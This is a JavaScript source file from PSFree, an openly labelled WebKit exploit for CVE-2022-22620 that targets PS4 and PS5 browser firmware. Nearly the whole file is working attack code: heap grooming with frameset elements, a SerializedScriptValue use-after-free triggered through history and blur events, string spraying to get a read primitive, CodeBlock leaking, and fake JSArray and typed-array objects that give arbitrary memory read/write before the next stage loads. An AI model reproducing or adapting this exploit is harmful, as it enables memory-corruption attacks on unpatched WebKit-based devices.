/* Copyright (C) 2023-2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// PSFree is a WebKit exploit using CVE-2022-22620 to gain arbitrary read/write
//
// vulnerable:
// * PS4 [6.00, 10.00)
// * PS5 [1.00, 6.00)
//
// * CelesteBlue from ps4-dev on discord.com
//   * Helped in figuring out the size of WebCore::SerializedScriptValue and
//     its needed offsets on different firmwares.
//   * figured out the range of vulnerable firmwares
// * janisslsm from ps4-dev on discord.com
//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
//     needed offsets on different firmwares.
// * Kameleon_ from ps4-dev on discord.com - tester
// * SlidyBat from PS5 R&D discord.com
//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
//     needed offsets on different firmwares (PS5).

import { Int } from './module/int64.mjs';
import { Memory,mem } from './module/mem.mjs';
import { KB, MB } from './module/offset.mjs';
import { BufferView } from './module/rw.mjs';

import {
    die,
    DieError,
    log,
    clear_log,
    sleep,
    hex,
    align,
} from './module/utils.mjs';

import * as config from './config.mjs';
import * as off from './module/offset.mjs';

// check if we are running on a supported firmware version
const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = (() => {
        if (is_ps4) {
            return [0x600, 0x1000];
        } else {
            return [0x100, 0x600];
        }
    })();

    if (!(lower <= version && version < upper)) {
        throw RangeError(`invalid config.target: ${hex(value)}`);
    }

    return [is_ps4, version];
})();

const ssv_len = (() => {
    if (0x600 <= config.target && config.target < 0x650) {
        return 0x58;
    }

    // PS4 9.xx and all supported PS5 versions
    if (config.target >= 0x900) {
        return 0x50;
    }

    if (0x650 <= config.target && config.target < 0x900) {
        return 0x48;
    }
})();

// these constants are expected to be divisible by 2
const num_fsets = 0x180;
const num_spaces = 0x40;
const num_adjs = 8;

const num_reuses = 0x300;
const num_strs = 0x200;
const num_leaks = 0x100;

// we can use the rows attribute of a frameset to allocate from fastMalloc
//
// see parseAttribute() from
// WebKit/Source/WebCore/html/HTMLFrameSetElement.cpp at PS4 8.0x
//
// parseAttribute() will call newLengthArray():
//
// UniqueArray<Length> newLengthArray(const String& string, int& len)
// {
//     RefPtr<StringImpl> str = string.impl()->simplifyWhiteSpace();
//     ...
//     len = countCharacter(*str, ',') + 1; [1]
//     auto r = makeUniqueArray<Length>(len); [2]
//     ...
// }
//
// pseudocode definition:
//
// class UniqueArray<Length>:
//     size_t _size; [3]
//     Length _data[];
//
// [2] allocates from the fastMalloc heap. [1] will add an additional 1 to len.
// [3] adds an extra 8 bytes to the array
//
// a Length is 8 bytes in size. if we want to allocate ssv_len bytes from
// fastMalloc, then we need:
//
// const num_repeats = ssv_len / 8 - 2;
// const rows = ','.repeat(num_repeats);
const rows = ','.repeat(ssv_len / 8 - 2);

const original_strlen = ssv_len - off.size_strimpl;
const original_loc = location.pathname;

function gc() {
    new Uint8Array(4 * MB);
}

function sread64(str, offset) {
    const low = (
        str.charCodeAt(offset)
        | str.charCodeAt(offset + 1) << 8
        | str.charCodeAt(offset + 2) << 16
        | str.charCodeAt(offset + 3) << 24
    );
    const high = (
        str.charCodeAt(offset + 4)
        | str.charCodeAt(offset + 5) << 8
        | str.charCodeAt(offset + 6) << 16
        | str.charCodeAt(offset + 7) << 24
    );
    return new Int(low, high);
}

function prepare_uaf() {
    const fsets = [];
    const indices = [];

    function alloc_fs(fsets, size) {
        for (let i = 0; i < size / 2; i++) {
            const fset = document.createElement('frameset');
            fset.rows = rows;
            fset.cols = rows;
            fsets.push(fset);
        }
    }

    // the first call to either replaceState/pushState is likely to allocate a
    // JSC::IsoAlignedMemoryAllocator near the SSV it creates. this prevents
    // the SmallLine where the SSV resides from being freed. so we do a dummy
    // call first
    history.replaceState('state0', '');

    alloc_fs(fsets, num_fsets);

    // the "state1" SSVs is what we will UAF

    history.pushState('state1', '', original_loc + '#bar');
    indices.push(fsets.length);

    alloc_fs(fsets, num_spaces);

    history.pushState('state1', '', original_loc + '#foo');
    indices.push(fsets.length);

    alloc_fs(fsets, num_spaces);

    history.pushState('state2', '');
    return [fsets, indices];
}

// WebCore::SerializedScriptValue use-after-free
//
// be careful when accessing history.state since History::state() will get
// called. History will cache the SSV at its m_lastStateObjectRequested if you
// do. that field is a RefPtr, thus preventing a UAF if we cache "state1"
async function uaf_ssv(fsets, index, index2) {
    const views = [];
    const input = document.createElement('input');
    input.id = 'input';
    const foo = document.createElement('input');
    foo.id = 'foo';
    const bar = document.createElement('a');
    bar.id = 'bar';

    log(`ssv_len: ${hex(ssv_len)}`);

    let pop = null;
    let pop2 = null;
    let pop_promise2 = null;
    let blurs = [0, 0];
    let resolves = [];

    function onpopstate(event) {
        const no_pop = pop === null;
        const idx = no_pop ? 0 : 1;

        log(`pop ${idx} came`);
        if (blurs[idx] === 0) {
            const r = resolves[idx][1];
            r(new DieError(`blurs before pop ${idx} came: ${blurs[idx]}`));
        }

        if (no_pop) {
            pop_promise2 = new Promise((resolve, reject) => {
                resolves.push([resolve, reject]);
                addEventListener('popstate', onpopstate, {once: true});
                history.back();
            });
        }

        if (no_pop) {
            pop = event;
        } else {
            pop2 = event;
        }
        resolves[idx][0]();
    }

    const pop_promise = new Promise((resolve, reject) => {
        resolves.push([resolve, reject]);
        addEventListener('popstate', onpopstate, {once: true});
    });

    function onblur(event) {
        const target = event.target;
        const is_input = target === input;
        const idx = is_input ? 0 : 1;
        log(`${target.id} blur came`);

        if (blurs[idx] > 0)  {
            die(`${name}: multiple blurs. blurs: ${blurs[idx]}`);
        }

        // we replace the URL with the original so the user can rerun the
        // exploit via a reload. If we don't, the exploit will append another
        // "#foo" to the URL and the input element will not be blurred because
        // the foo element won't be scrolled to during history.back()
        history.replaceState('state3', '', original_loc);

        // free the SerializedScriptValue's neighbors and thus free the
        // SmallLine where it resides
        const fset_idx = is_input ? index : index2;
        for (let i = fset_idx - num_adjs/2; i < fset_idx + num_adjs/2; i++) {
            fsets[i].rows = '';
            fsets[i].cols = '';
        }

        for (let i = 0; i < num_reuses; i++) {
            const view = new Uint8Array(new ArrayBuffer(ssv_len));
            view[0] = 0x41;
            views.push(view);
        }

        blurs[idx]++;
    }

    input.addEventListener('blur', onblur);
    foo.addEventListener('blur', onblur);

    document.body.append(input);
    document.body.append(foo);
    document.body.append(bar);

    // FrameLoader::loadInSameDocument() calls Document::statePopped().
    // statePopped() will defer firing of popstate until we're in the complete
    // state
    //
    // this means that onblur() will run with "state2" as the current history
    // item if we call loadInSameDocument too early
    log(`readyState now: ${document.readyState}`);

    if (document.readyState !== 'complete') {
        await new Promise(resolve => {
            document.addEventListener('readystatechange', function foo() {
                if (document.readyState === 'complete') {
                    document.removeEventListener('readystatechange', foo);
                    resolve();
                }
            });
        });
    }

    log(`readyState now: ${document.readyState}`);

    await new Promise(resolve => {
        input.addEventListener('focus', resolve, {once: true});
        input.focus();
    });

    history.back();
    await pop_promise;
    await pop_promise2;

    log('done await popstate');

    input.remove();
    foo.remove();
    bar.remove();

    const res = [];
    for (let i = 0; i < views.length; i++) {
        const view = views[i];
        if (view[0] !== 0x41) {
            log(`view index: ${hex(i)}`);
            log('found view:');
            log(view);

            // set SSV's refcount to 1, all other fields to 0/NULL
            view[0] = 1;
            view.fill(0, 1);

            if (res.length) {
                res[1] = [new BufferView(view.buffer), pop2];
                break;
            }

            // return without keeping any references to pop, making it GC-able.
            // its WebCore::PopStateEvent will then be freed on its death
            res[0] = new BufferView(view.buffer);
            i = num_reuses - 1;
        }
    }

    if (res.length !== 2) {
        die('failed SerializedScriptValue UAF');
    }
    return res;
}

class Reader {
    constructor(rstr, rstr_view) {
        this.rstr = rstr;
        this.rstr_view = rstr_view;
        this.m_data = rstr_view.read64(off.strimpl_m_data);
    }

    read8_at(offset) {
        return this.rstr.charCodeAt(offset);
    }

    read32_at(offset) {
        const str = this.rstr;
        return (
            str.charCodeAt(offset)
            | str.charCodeAt(offset + 1) << 8
            | str.charCodeAt(offset + 2) << 16
            | str.charCodeAt(offset + 3) << 24
        ) >>> 0;
    }

    read64_at(offset) {
        return sread64(this.rstr, offset);
    }

    read64(addr) {
        this.rstr_view.write64(off.strimpl_m_data, addr);
        return sread64(this.rstr, 0);
    }

    set_addr(addr) {
        this.rstr_view.write64(off.strimpl_m_data, addr);
    }

    // remember to use this to fix up the StringImpl before freeing it
    restore() {
        this.rstr_view.write64(off.strimpl_m_data, this.m_data);
        this.rstr_view.write32(off.strimpl_strlen, original_strlen);
    }
}

// we now have a double free on the fastMalloc heap
async function make_rdr(view) {
    let str_wait = 0;
    const strs = [];
    const u32 = new Uint32Array(1);
    const u8 = new Uint8Array(u32.buffer);
    const marker_offset = original_strlen - 4;
    const pad = 'B'.repeat(marker_offset);

    log('start string spray');
    while (true) {
        for (let i = 0; i < num_strs; i++) {
            u32[0] = i;
            // on versions like 8.0x:
            // * String.fromCharCode() won't create a 8-bit string. so we use
            //   fromCodePoint() instead
            // * Array.prototype.join() won't try to convert 16-bit strings to
            //   8-bit
            //
            // given the restrictions above, we will ensure "str" is always a
            // 8-bit string. you can check a WebKit source code (e.g. on 8.0x)
            // to see that String.prototype.repeat() will create a 8-bit string
            // if the repeated string's length is 1
            //
            // Array.prototype.join() calls JSC::JSStringJoiner::join(). it
            // returns a plain JSString (not a JSRopeString). that means we
            // have allocated a WTF::StringImpl with the proper size and whose
            // string data is inlined
            const str = [pad, String.fromCodePoint(...u8)].join('');
            strs.push(str);
        }

        if (view.read32(off.strimpl_inline_str) === 0x42424242) {
            view.write32(off.strimpl_strlen, 0xffffffff);
            break;
        }

        strs.length = 0;
        gc();
        await sleep();
        str_wait++;
    }
    log(`JSString reused memory at loop: ${str_wait}`);

    const idx = view.read32(off.strimpl_inline_str + marker_offset);
    log(`str index: ${hex(idx)}`);
    log('view:');
    log(view);

    // versions like 8.0x have a JSC::JSString that have their own m_length
    // field. strings consult that field instead of the m_length of their
    // StringImpl
    //
    // we work around this by passing the string to Error.
    // ErrorInstance::create() will then create a new JSString initialized from
    // the StringImpl of the message argument
    const rstr = Error(strs[idx]).message;
    log(`str len: ${hex(rstr.length)}`);
    if (rstr.length === 0xffffffff) {
        log('confirmed correct leaked');
        const addr = (
            view.read64(off.strimpl_m_data)
            .sub(off.strimpl_inline_str)
        );
        log(`view's buffer address: ${addr}`);
        return new Reader(rstr, view);
    }
    die("JSString wasn't modified");
}

// we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
// of JSValues whose size is ssv_len. the undefined constant is automatically
// added due to reasons such as "undefined is returned by default if the
// function exits without returning anything"
const cons_len = ssv_len - 8*5;
const bt_offset = 0;
const idx_offset = ssv_len - 8*3;
const strs_offset = ssv_len - 8*2;
const src_part = (() => {
    // we user var instead of let/const since such variables always get
    // initialized to the NULL JSValue even if you immediately return. we will
    // make functions that do as little as possible in order to speed up the
    // exploit. m_constantRegisters will still contain the unused constants
    //
    // function foo() {
    //     return;
    //     let a = 1;
    // }
    //
    // the resulting bytecode:
    // bb#1
    // [   0] enter
    // [   1] get_scope          loc4
    // [   3] mov                loc5, loc4
    // [   6] check_traps
    // // this part still initializes a with the NULL JSValue
    // [   7] mov                loc6, <JSValue()>(const0)
    // [  10] ret                Undefined(const1)
    // Successors: [ ]
    //
    // bb#2
    // [  12] mov                loc6, Int32: 1(const2)
    // [  15] ret                Undefined(const1)
    // Successors: [ ]
    //
    //
    // Constants:
    //    k0 = <JSValue()>
    //    k1 = Undefined
    //    k2 = Int32: 1: in source as integer
    let res = 'var f = 0x11223344;\n';
    // make unique constants that won't collide with the possible marker values
    for (let i = 0; i < cons_len; i += 8) {
        res += `var a${i} = ${num_leaks + i};\n`;
    }
    return res;
})();

async function leak_code_block(reader, bt_size) {
    const rdr = reader;
    const bt = [];
    // take into account the cell and indexing header of the immutable
    // butterfly
    for (let i = 0; i < bt_size - 0x10; i += 8) {
        bt.push(i);
    }

    // cache the global variable resolution
    const slen = ssv_len;

    const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
    const part = bt_part + src_part;
    const cache = [];
    for (let i = 0; i < num_leaks; i++) {
        cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
    }

    const chunkSize = (is_ps4 && version < 0x900) ? 128 * KB : 1 * MB;
    const smallPageSize = 4 * KB;
    const search_addr = align(rdr.m_data, chunkSize);
    log(`search addr: ${search_addr}`);

    log(`func_src:\n${cache[0]}\nfunc_src end`);
    log('start find CodeBlock');
    let winning_off = null;
    let winning_idx = null;
    let winning_f = null;
    let find_cb_loop = 0;
    // false positives
    let fp = 0;
    rdr.set_addr(search_addr);
    loop: while (true) {
        const funcs = [];
        for (let i = 0; i < num_leaks; i++) {
            const f = Function(cache[i]);
            // the first call allocates the CodeBlock
            f();
            funcs.push(f);
        }

        for (let p = 0; p < chunkSize; p += smallPageSize) {
            for (let i = p; i < p + smallPageSize; i += slen) {
                if (rdr.read32_at(i + 8) !== 0x11223344) {
                    continue;
                }

                rdr.set_addr(rdr.read64_at(i + strs_offset));
                const m_type = rdr.read8_at(5);
                // make sure we're not reading the constant registers of an
                // UnlinkedCodeBlock. those have JSTemplateObjectDescriptors.
                // CodeBlock converts those to JSArrays
                if (m_type !== 0) {
                    rdr.set_addr(search_addr);
                    winning_off = i;
                    winning_idx = rdr.read32_at(i + idx_offset);
                    winning_f = funcs[winning_idx];
                    break loop;
                }
                rdr.set_addr(search_addr);
                fp++;
            }
        }

        find_cb_loop++;
        gc();
        await sleep();
    }
    log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
    log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);

    log('CodeBlock.m_constantRegisters.m_buffer:');
    rdr.set_addr(search_addr.add(winning_off));
    for (let i = 0; i < slen; i += 8) {
        log(`${rdr.read64_at(i)} | ${hex(i)}`);
    }

    const bt_addr = rdr.read64_at(bt_offset);
    const strs_addr = rdr.read64_at(strs_offset);
    log(`immutable butterfly addr: ${bt_addr}`);
    log(`string array passed to tag addr: ${strs_addr}`);

    log('JSImmutableButterfly:');
    rdr.set_addr(bt_addr);
    for (let i = 0; i < bt_size; i += 8) {
        log(`${rdr.read64_at(i)} | ${hex(i)}`);
    }

    log('string array:');
    rdr.set_addr(strs_addr);
    for (let i = 0; i < off.size_jsobj; i += 8) {
        log(`${rdr.read64_at(i)} | ${hex(i)}`);
    }

    return [winning_f, bt_addr, strs_addr];
}

// data to write to the SerializedScriptValue
//
// setup to make deserialization create an ArrayBuffer with an arbitrary buffer
// address
function make_ssv_data(ssv_buf, view, view_p, addr, size) {
    // sizeof JSC::ArrayBufferContents
    const size_abc = (() => {
        if (is_ps4) {
            return version >= 0x900 ? 0x18 : 0x20;
        } else {
            return version >= 0x300 ? 0x18 : 0x20;
        }
    })();

    const data_len = 9;
    // sizeof WTF::Vector<T>
    const size_vector = 0x10;

    // SSV offsets
    const off_m_data = 8;
    const off_m_abc = 0x18;
    // view offsets
    const voff_vec_abc = 0; // Vector<ArrayBufferContents>
    const voff_abc = voff_vec_abc + size_vector; // ArrayBufferContents
    const voff_data = voff_abc + size_abc;

    // WTF::Vector<unsigned char>
    // write m_data
    // m_buffer
    ssv_buf.write64(off_m_data, view_p.add(voff_data));
    // m_capacity
    ssv_buf.write32(off_m_data + 8, data_len);
    // m_size
    ssv_buf.write64(off_m_data + 0xc, data_len);

    // 6 is the serialization format version number for ps4 6.00. The format
    // is backwards compatible and using a value less than the current version
    // number used by a specific WebKit version is considered valid.
    //
    // See CloneDeserializer::isValid() from
    // WebKit/Source/WebCore/bindings/js/SerializedScriptValue.cpp at PS4 8.0x.
    const CurrentVersion = 6;
    const ArrayBufferTransferTag = 23;
    view.write32(voff_data, CurrentVersion);
    view[voff_data + 4] = ArrayBufferTransferTag;
    view.write32(voff_data + 5, 0);

    // std::unique_ptr<WTF::Vector<JSC::ArrayBufferContents>>
    // write m_arrayBufferContentsArray
    ssv_buf.write64(off_m_abc, view_p.add(voff_vec_abc));
    // write WTF::Vector<JSC::ArrayBufferContents>
    view.write64(voff_vec_abc, view_p.add(voff_abc));
    view.write32(voff_vec_abc + 8, 1);
    view.write32(voff_vec_abc + 0xc, 1);

    if (size_abc === 0x20) {
        // m_destructor, offset 0, leave as 0
        // m_shared, offset 8, leave as 0
        // m_data
        view.write64(voff_abc + 0x10, addr);
        // m_sizeInBytes
        view.write32(voff_abc + 0x18, size);
    } else {
        // m_data
        view.write64(voff_abc + 0, addr);
        // m_destructor (48 bits), offset 8, leave as 0
        // m_shared (48 bits), offset 0xe, leave as 0
        // m_sizeInBytes
        view.write32(voff_abc + 0x14, size);
    }
}

async function make_arw(reader, view2, pop) {
    const rdr = reader;

    // we have to align the fake object to atomSize (16) else the process
    // crashes. we don't know why
    //
    // since cells (GC memory chunks) are always aligned to atomSize, there
    // might be code that's assuming that all GC pointers are aligned
    //
    // see atomSize from WebKit/Source/JavaScriptCore/heap/MarkedBlock.h at
    // PS4 8.0x
    const fakeobj_off = 0x20;
    const fakebt_base = fakeobj_off + off.size_jsobj;
    // sizeof JSC::IndexingHeader
    const indexingHeader_size = 8;
    // sizeof JSC::ArrayStorage
    const arrayStorage_size = 0x18;
    // there's only the .raw property
    const propertyStorage = 8;
    const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;

    log('STAGE: leak CodeBlock');
    // has too be greater than 0x10. the size of JSImmutableButterfly
    const bt_size = 0x10 + fakebt_off + arrayStorage_size;
    const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);

    const view = rdr.rstr_view;
    const view_p = rdr.m_data.sub(off.strimpl_inline_str);
    const view_save = new Uint8Array(view);

    view.fill(0);
    make_ssv_data(view2, view, view_p, bt_addr, bt_size);

    const bt = new BufferView(pop.state);
    view.set(view_save);

    log('ArrayBuffer pointing to JSImmutableButterfly:');
    for (let i = 0; i < bt.byteLength; i += 8) {
        log(`${bt.read64(i)} | ${hex(i)}`);
    }

    // the immutable butterfly's indexing type is ArrayWithInt32 so
    // JSImmutableButterfly::visitChildren() won't ask the GC to scan its slots
    // for JSObjects to recursively visit. this means that we can write
    // anything to the the butterfly's data area without fear of a GC crash

    const val_true = 7; // JSValue of "true"
    const strs_cell = rdr.read64(strs_addr);

    bt.write64(fakeobj_off, strs_cell);
    bt.write64(fakeobj_off + off.js_butterfly, bt_addr.add(fakebt_off));

    // since .raw is the first ever created property, it's just besides the
    // indexing header
    bt.write64(fakebt_off - 0x10, val_true);
    // indexing header's publicLength and vectorLength
    bt.write32(fakebt_off - 8, 1);
    bt.write32(fakebt_off - 8 + 4, 1);

    // custom ArrayStorage that allows read/write to index 0. we have to use an
    // ArrayStorage because the structure assigned to the structure ID expects
    // one so visitButterfly() will crash if we try to fake the object with a
    // regular butterfly

    // m_sparseMap
    bt.write64(fakebt_off, 0);
    // m_indexBias
    bt.write32(fakebt_off + 8, 0);
    // m_numValuesInVector
    bt.write32(fakebt_off + 0xc, 1);

    // m_vector[0]
    bt.write64(fakebt_off + 0x10, val_true);

    // immutable_butterfly[0] = fakeobj;
    bt.write64(0x10, bt_addr.add(fakeobj_off));

    const fake = func()[0];
    log(`fake.raw: ${fake.raw}`);
    log(`fake[0]: ${fake[0]}`);
    log(`fake: [${fake}]`);

    const test_val = 3;
    log(`test setting fake[0] to ${test_val}`);
    fake[0] = test_val;
    if (fake[0] !== test_val) {
        die(`unexpected fake[0]: ${fake[0]}`);
    }

    function addrof(obj) {
        fake[0] = obj;
        return bt.read64(fakebt_off + 0x10);
    }

    // m_mode = WastefulTypedArray, allocated buffer on the fastMalloc heap,
    // unlike FastTypedArray, where the buffer is managed by the GC. This
    // prevents random crashes.
    //
    // See JSGenericTypedArrayView<Adaptor>::visitChildren() from
    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayViewInlines.h at
    // PS4 8.0x.
    const worker = new DataView(new ArrayBuffer(1));
    const main_template = new Uint32Array(new ArrayBuffer(off.size_view));

    const leaker = {addr: null, 0: 0};

    const worker_p = addrof(worker);
    const main_p = addrof(main_template);
    const leaker_p = addrof(leaker);

    // we'll fake objects using a JSArrayBufferView whose m_mode is
    // FastTypedArray. it's safe to use its buffer since it's GC-allocated. the
    // current fastSizeLimit is 1000. if the length is less than or equal to
    // that, we get a FastTypedArray
    const scaled_sview = off.size_view / 4;
    const faker = new Uint32Array(scaled_sview);
    const faker_p = addrof(faker);
    const faker_vector = rdr.read64(faker_p.add(off.view_m_vector));

    const vector_idx = off.view_m_vector / 4;
    const length_idx = off.view_m_length / 4;
    const mode_idx = off.view_m_mode / 4;
    const bt_idx = off.js_butterfly / 4;

    // fake a Uint32Array using GC memory
    faker[vector_idx] = worker_p.lo;
    faker[vector_idx + 1] = worker_p.hi;
    faker[length_idx] = scaled_sview;

    rdr.set_addr(main_p);
    faker[mode_idx] = rdr.read32_at(off.view_m_mode);
    // JSCell
    faker[0] = rdr.read32_at(0);
    faker[1] = rdr.read32_at(4);
    faker[bt_idx] = rdr.read32_at(off.js_butterfly);
    faker[bt_idx + 1] = rdr.read32_at(off.js_butterfly + 4);

    // fakeobj()
    bt.write64(fakebt_off + 0x10, faker_vector);
    const main = fake[0];

    log('main (pointing to worker):');
    for (let i = 0; i < off.size_view; i += 8) {
        const idx = i / 4;
        log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
    }

    new Memory(
        main, worker, leaker,
        leaker_p.add(off.js_inline_prop),
        rdr.read64(leaker_p.add(off.js_butterfly)),
    );
    log('achieved arbitrary r/w');

    rdr.restore();
    // set the refcount to a high value so we don't free the memory, view's
    // death will already free it (a StringImpl is currently using the memory)
    view.write32(0, -1);
    // ditto (a SerializedScriptValue is currently using the memory)
    view2.write32(0, -1);
    // we don't want its death to call fastFree() on GC memory
    make_arw._buffer = bt.buffer;
}

async function main() {
    log('STAGE: UAF SSV');
    const [fsets, indices] = prepare_uaf();
    const [view, [view2, pop]] = await uaf_ssv(fsets, indices[1], indices[0]);

    log('STAGE: get string relative read primitive');
    const rdr = await make_rdr(view);

    for (const fset of fsets) {
        fset.rows = '';
        fset.cols = '';
    }

    log('STAGE: achieve arbitrary read/write primitive');
    await make_arw(rdr, view2, pop);

    clear_log();
    // path to your script that will use the exploit
    import('./lapse.mjs');
}
main();
